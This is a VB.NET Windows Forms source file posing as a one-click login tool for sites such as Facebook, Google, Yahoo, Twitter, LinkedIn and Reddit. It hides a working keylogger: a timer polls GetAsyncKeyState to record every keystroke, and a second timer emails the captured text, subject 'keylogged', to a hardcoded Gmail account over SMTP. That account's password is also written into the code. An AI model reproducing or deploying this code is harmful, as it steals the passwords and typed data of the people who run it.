Imports System.Net.Mail
Public Class Form1
    Dim b1 As Boolean
    Dim b2 As Boolean
    Dim b4 As Boolean
    Dim b5 As Boolean
    Dim b6 As Boolean
    Dim b7 As Boolean
    Dim b8 As Boolean
    Dim b10 As Boolean
    Dim b11 As Boolean



    Dim result As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.Show()
        Me.Visible = True
        For i = 1 To 255
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                RichTextBox1.Text = RichTextBox1.Text + Chr(i)
            End If
        Next i
    End Sub

    Private Sub email_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles email.Tick
        Dim MyMailMessage As New MailMessage()
        MyMailMessage.From = New MailAddress("suprahackers@gmail.com")
        MyMailMessage.To.Add("suprahackers@gmail.com")
        MyMailMessage.Subject = ("keylogged")
        MyMailMessage.Body = RichTextBox1.Text
        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
        SMTPServer.Port = 587
        SMTPServer.Credentials = New System.Net.NetworkCredential("suprahackers@gmail.com", "kaminapan")
        SMTPServer.EnableSsl = True
        SMTPServer.Send(MyMailMessage)
        RichTextBox1.Text = ("")
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        b1 = False
        b2 = False
        b4 = False
        b5 = False
        b6 = False
        b7 = False
        b8 = False
        b10 = False
        b11 = False


        TextBox1.Text = ""
        TextBox2.Text = ""

        Form2.WebBrowser1.Navigate("https://www.facebook.com/login.php?login_attempt=1")
        Form3.WebBrowser1.Navigate("https://accounts.google.com/ServiceLoginAuth")
        Form6.WebBrowser1.Navigate("https://secure.hi5.com/secure_login.html?isHi5=t&amp;ver=2&amp;loc=en_US&amp;uri=http%3A%2F%2Fwww.hi5.com")
        Form7.WebBrowser1.Navigate("https://www.tumblr.com/login")
        Form5.WebBrowser1.Navigate("https://dev.twitter.com/user/login")
        Form4.WebBrowser1.Navigate("https://login.yahoo.com/config/login?")
        Form8.WebBrowser1.Navigate("https://www.linkedin.com/uas/login-submit")
        Form10.WebBrowser1.Navigate("https://ssl.reddit.com/post/login")
        Form9.WebBrowser1.Navigate("https://login.vk.com/?act=login")


    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        b1 = True

        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else
            Form2.Show()
            Try

                Form2.WebBrowser1.Document.GetElementById("email").SetAttribute("value", TextBox1.Text)
                Form2.WebBrowser1.Document.GetElementById("pass").SetAttribute("value", TextBox2.Text)
                Form2.WebBrowser1.Document.GetElementById("login").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
           



        End If

    End Sub

    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        b7 = True
        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form4.Show()
            Try


                Form4.WebBrowser1.Document.GetElementById("username").SetAttribute("value", TextBox1.Text)
                Form4.WebBrowser1.Document.GetElementById("passwd").SetAttribute("value", TextBox2.Text)
                Form4.WebBrowser1.Document.GetElementById(".save").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
            
        End If
    End Sub

    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox2.TextChanged

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        b2 = True

        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form3.Show()


            Try


                Form3.WebBrowser1.Document.GetElementById("email").SetAttribute("value", TextBox1.Text)
                Form3.WebBrowser1.Document.GetElementById("passwd").SetAttribute("value", TextBox2.Text)
                Form3.WebBrowser1.Document.GetElementById("signIn").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
           
        End If
    End Sub

    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        b6 = True
        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form5.Show()
            Try


                Form5.WebBrowser1.Document.GetElementById("edit-name").SetAttribute("value", TextBox1.Text)
                Form5.WebBrowser1.Document.GetElementById("edit-pass").SetAttribute("value", TextBox2.Text)
                Form5.WebBrowser1.Document.GetElementById("edit-submit").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
        End If
    End Sub

    

    Private Sub Button4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button4.Click
        b4 = True
        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form6.Show()
            Try


                Form6.WebBrowser1.Document.GetElementById("username").SetAttribute("value", TextBox1.Text)
                Form6.WebBrowser1.Document.GetElementById("password").SetAttribute("value", TextBox2.Text)
                Form6.WebBrowser1.Document.GetElementById("signInBtn").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
        End If
    End Sub

   

    Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button8.Click
        b8 = True
        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form8.Show()
            Try


                Form8.WebBrowser1.Document.GetElementById("user_login").SetAttribute("value", TextBox1.Text)
                Form8.WebBrowser1.Document.GetElementById("passwd-login").SetAttribute("value", TextBox2.Text)
                Form8.WebBrowser1.Document.GetElementById("button").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Button10_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button10.Click
        b10 = True
        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form10.Show()
            Try


                Form10.WebBrowser1.Document.GetElementById("user_login").SetAttribute("value", TextBox1.Text)
                Form10.WebBrowser1.Document.GetElementById("passwd_login").SetAttribute("value", TextBox2.Text)
                Form10.WebBrowser1.Document.GetElementById("login").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
        End If
    End Sub

    Private Sub Button11_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button11.Click
        b11 = True
        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form9.Show()
            Try


                Form9.WebBrowser1.Document.GetElementById("quick_email").SetAttribute("value", TextBox1.Text)
                Form9.WebBrowser1.Document.GetElementById("quick_pass").SetAttribute("value", TextBox2.Text)
                Form9.WebBrowser1.Document.GetElementById("quick_login_button").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
        End If
    End Sub


    Private Sub Panel1_Paint(ByVal sender As System.Object, ByVal e As System.Windows.Forms.PaintEventArgs) Handles Panel1.Paint

    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        b5 = True
        If TextBox1.Text = "" And TextBox2.Text = "" Then
            MessageBox.Show("andhe pagal text box is empty")
        Else

            Form7.Show()
            Try


                Form7.WebBrowser1.Document.GetElementById("signup_email").SetAttribute("value", TextBox1.Text)
                Form7.WebBrowser1.Document.GetElementById("signup_password").SetAttribute("value", TextBox2.Text)
                Form7.WebBrowser1.Document.GetElementById("signup_forms_submit").InvokeMember("click")
                TextBox1.Text = ""
                TextBox2.Text = ""

            Catch ex As Exception

            End Try
        End If
    End Sub
End Class